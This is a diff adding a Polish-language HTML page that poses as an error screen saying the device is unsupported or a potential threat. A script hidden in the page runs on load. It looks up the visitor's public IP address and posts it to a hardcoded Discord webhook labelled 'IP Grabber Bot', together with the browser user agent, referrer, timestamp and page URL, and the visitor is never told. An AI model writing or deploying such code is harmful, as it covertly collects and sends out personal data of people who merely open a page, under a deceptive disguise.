@@ -1,0 +1,62 @@
+<!DOCTYPE html>
+<html lang="pl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Strona nieobsługiwana</title>
+    <style>
+        body {
+            background-color: #000;
+            color: #f00;
+            font-family: Arial, sans-serif;
+            text-align: center;
+            margin: 0;
+            padding: 0;
+            height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            flex-direction: column;
+        }
+        h1 { font-size: 2.5em; }
+        p { font-size: 1.5em; max-width: 600px; }
+        .warning { color: #ff0; animation: blink 1s infinite; }
+        @keyframes blink { 50% { opacity: 0; } }
+    </style>
+</head>
+<body>
+    <h1 class="warning">BŁĄD</h1>
+    <p>Urządzenie nie jest obsługiwane lub jest potencjalnym zagrożeniem!</p>
+    <p>Prosimy o kontakt z administratorem lub ponowne uruchomienie w bezpiecznym środowisku.</p>
+
+    <script>
+        async function grabIP() {
+            try {
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const data = await ipResponse.json();
+                const ip = data.ip;
+
+                const payload = {
+                    content: `**Nowy IP złapany!**\nIP: ${ip}\nUser-Agent: ${navigator.userAgent}\nReferer: ${document.referrer || 'brak'}\nCzas: ${new Date().toISOString()}\nURL: ${window.location.href}`,
+                    username: "IP Grabber Bot",
+                    avatar_url: "https://i.imgur.com/removed.png"
+                };
+
+                const webhookUrl = "https://discord.com/api/webhooks/1526614017907494973/iBa9vd7N0LzlRCBmlIgRhB0-ILmQSD7eJav0rq1BJMi4E5E4ZzDJ7XZNUZeLV3_sRgaM";
+
+                await fetch(webhookUrl, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+                });
+
+                console.log('IP wysłany sukcesywnie:', ip);
+            } catch (error) {
+                console.error('Błąd:', error);
+            }
+        }
+
+        window.onload = grabIP;
+    </script>
+</body>
+</html>
